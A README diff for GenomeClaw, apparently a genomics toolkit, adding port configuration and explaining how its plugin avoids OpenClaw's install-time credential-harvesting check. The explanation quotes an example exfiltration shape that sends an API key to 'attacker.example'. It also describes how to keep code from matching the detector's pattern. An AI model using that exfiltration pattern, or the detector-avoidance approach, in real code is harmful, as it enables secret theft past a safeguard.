@@ -304,8 +304,50 @@ The shim honors a few env vars:
 
 - `GENOMECLAW_IMAGE` — image reference (default `genomeclaw/toolkit:dev`).
 - `GENOMECLAW_RAW_DIR`, `GENOMECLAW_REF_DIR`, `GENOMECLAW_DERIVED_DIR`, `GENOMECLAW_SCRATCH_DIR` — host paths bind-mounted at `/mnt/genomeclaw/{raw(ro), reference(ro), derived(rw), scratch(rw)}`. See [Storage planning](#storage-planning) for what goes where. The shim auto-creates `GENOMECLAW_SCRATCH_DIR` on first run, and auto-detects defaults under `/Volumes/Genome_Work/genomeclaw/` after `genomeclaw host setup` lays out the canonical layout.
+- `GENOMECLAW_HOST_SERVICE_PORT` — port the `genomeclaw host service` uvicorn binds on the host (default **8645**). See [Coexisting with other Claw projects on one host](#coexisting-with-other-claw-projects-on-one-host) for why this is 8645 and not 8643.
 - `GENOMECLAW_OFFLINE=1` — pass `--network none` (forbids egress; useful for ingest/normalize/annotate, breaks `fetch`).
 - `GENOMECLAW_NATIVE=1` — bypass Docker; invoke a locally installed `genomeclaw` (inner-loop dev with `uv run`).
+
+### Coexisting with other Claw projects on one host
+
+GenomeClaw's host service binds **port 8645** by default. Sibling Claw projects bind distinct ports so they coexist without collision:
+
+| Project | Default host-service port | Override env var |
+|---------|---------------------------|------------------|
+| GenomeClaw | **8645** | `GENOMECLAW_HOST_SERVICE_PORT` |
+| [DevRelClaw](https://github.com/OpenRavenClaw/DevRelClaw) | **8643** | `DEVRELGRAPH_HOST_SERVICE_PORT` |
+
+Why distinct ports matter beyond "no `EADDRINUSE`": each project's in-sandbox OpenShell L7 policy preset asserts the host:port pair literally. If two services shared a port, the policy couldn't distinguish "the right service answered" from "the wrong service answered" — privacy enforcement would depend on operator vigilance instead of structural separation. Distinct defaults + per-project policy allowlists make the L7 layer the load-bearing guarantee (see [docs/reports/genomeclaw-devrelclaw-coexistence-2026-05-24.md](docs/reports/genomeclaw-devrelclaw-coexistence-2026-05-24.md) for the full analysis).
+
+**To override the port** (e.g., port 8645 is busy or you want a third project on this host):
+
+```bash
+# 1. Pick a new port + tell the shim
+export GENOMECLAW_HOST_SERVICE_PORT=8649
+
+# 2. Rebuild the sandbox image with the matching policy-preset port baked in
+docker build \
+  --build-arg GENOMECLAW_HOST_PORT=8649 \
+  -t genomeclaw/sandbox:port-8649 \
+  -f packages/nemoclaw-plugin/sandbox/Dockerfile \
+  packages/nemoclaw-plugin/
+
+# 3. Run host service on the new port
+bin/genomeclaw host service   # binds 127.0.0.1:8649 + 0.0.0.0:8649 inside container
+```
+
+The Python source-of-truth port lives in three places (all read the env var with default 8645): [packages/toolkit/src/genomeclaw_toolkit/_cli/commands/host.py](packages/toolkit/src/genomeclaw_toolkit/_cli/commands/host.py), [packages/toolkit/tests/_live_smoke/run.py](packages/toolkit/tests/_live_smoke/run.py), and [bin/genomeclaw](bin/genomeclaw). The sandbox-side policy-preset literal ships in [packages/nemoclaw-plugin/policy-preset.yaml](packages/nemoclaw-plugin/policy-preset.yaml) and is overridden by the `--build-arg GENOMECLAW_HOST_PORT=…` Dockerfile ARG at sandbox-image build time. The plugin's TypeScript default lives in [packages/nemoclaw-plugin/src/index.ts](packages/nemoclaw-plugin/src/index.ts) and is overridden at runtime via openclaw's config channel (`plugins.entries.genomeclaw.config.hostService.baseUrl`).
+
+#### Why the plugin reads config via the openclaw channel, not env vars
+
+OpenClaw's plugin loader runs a **static-analysis credential-harvesting check** at `openclaw plugins install` time. It blocks any plugin file that contains BOTH `process.env[...]` and `fetch(...)` — the canonical shape of a malicious plugin that reads a secret out of the environment and exfiltrates it (`OPENAI_API_KEY` → `fetch("https://attacker.example/", …)`). The heuristic is coarse — it can't tell "read a port number to build a legit URL" apart from "read an API key to send to an attacker" — so any runtime-config-via-env-var pattern in `src/index.ts` (which has `fetch()` in `safeCall()`) trips the install.
+
+We work around this in two places:
+
+- **Host-service port** flows through openclaw's **dedicated config channel**: the plugin declares `hostService.baseUrl` in `openclaw.plugin.json`; the operator (or the live-smoke harness or NemoClaw onboarding) sets the value via `openclaw config set plugins.entries.genomeclaw.config.hostService.baseUrl '"http://host.openshell.internal:8645"'`; the plugin reads it in `resolveConfig()`. **No env-var read in the plugin source** — this is the openclaw-intended pattern; runtime config was always supposed to go through this channel.
+- **SSRF runtime-probe enable gate** uses a **filesystem marker** (`/etc/genomeclaw/ssrf-probe-enabled`) instead of an env var. The plugin's `fs.existsSync(...)` call doesn't match the credential-harvesting heuristic. Production sandbox images ship without the marker (probe tool doesn't register; tool count stays at 9). The pytest harness `docker exec`s a `touch` after spawning the container but before starting the gateway, so 10 tools register for that test run only.
+
+Both workarounds are mechanical — they don't change what the plugin can do, just where the gating decision is keyed. Trade-off: marker-file gating is an extra step in the test harness that's easy to forget, but the probe test fails loudly (the tool wouldn't register, the agent's reply parser wouldn't find the expected JSON array) so silent regressions are unlikely.
 
 ### Intended onboarding once the MVP lands (sketched from [Story 1](docs/reference/user-stories.md))
 
